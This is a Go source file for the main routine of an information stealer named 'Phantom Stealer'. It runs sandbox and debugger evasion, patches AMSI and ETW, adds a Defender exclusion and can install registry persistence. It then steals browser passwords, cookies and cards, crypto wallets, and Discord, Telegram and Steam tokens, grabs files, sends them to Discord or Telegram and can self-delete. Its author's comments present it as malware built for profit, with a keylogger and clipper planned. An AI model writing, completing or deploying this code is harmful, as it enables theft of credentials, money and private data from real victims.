package main

/*
	Phantom Stealer v1.0
	---------------------
	started: sept 2025

	TODO: add keylogger module eventually
	TODO: maybe add clipper for crypto addresses?

	NOTE: compile with -ldflags "-s -w -H windowsgui" for production
*/

import (
	"os"
	"phantom/browsers"
	"phantom/config"
	"phantom/evasion"
	"phantom/exfil"
	"phantom/persist"
	"phantom/recon"
	"phantom/tokens"
	"phantom/wallets"
	"time"
)

func main() {
	// ============================================
	// PHASE 1: Environment checks
	// gotta make sure we're not in a sandbox first
	// learned this the hard way lol
	// ============================================
	if config.AntiVM || config.AntiDebug {
		if !evasion.RunAntiAnalysis(config.AntiVM, config.AntiDebug) {
			// nope, we're being analyzed - bail out silently
			os.Exit(0)
		}
	}

	// disable security features
	// these don't always work but worth trying
	evasion.PatchAMSI()
	evasion.PatchETW()

	// try to add exclusion - requires some luck with permissions
	evasion.AddDefenderExclusion()

	// ============================================
	// PHASE 2: Persistence (optional)
	// disabled by default cuz it's noisy, you can change iyw.
	// ============================================
	if config.Persistence {
		persist.Install(persist.Registry) // registry is most reliable imo
	}

	// ============================================
	// PHASE 3: Data collection
	// this is the good stuff
	// ============================================
	data := &exfil.StealerData{
		Timestamp: time.Now(),
		BuildID:   config.BuildID,
	}

	// get system info first - we need the hostname for the archive name
	data.SystemInfo = recon.Collect()

	// browsers - passwords, cookies, cards, etc
	data.Browsers = browsers.StealAll()

	// crypto wallets - both desktop and browser extensions
	data.Wallets = wallets.StealAll()

	// tokens - discord, telegram, steam
	data.Tokens = tokens.StealAll()

	// grab interesting files from common locations
	if config.FileGrabber {
		data.Files = recon.GrabFiles(
			config.FileExtensions,
			config.MaxFileSize,
			config.GrabberPaths,
		)
	}

	// ============================================
	// PHASE 4: Exfiltration
	// send everything to discord/telegram
	// ============================================
	exfil.Exfiltrate(data)

	// clean up if enabled
	// usually leave this off during testing
	if config.SelfDestruct {
		persist.SelfDelete()
	}

	// done! ez money
}
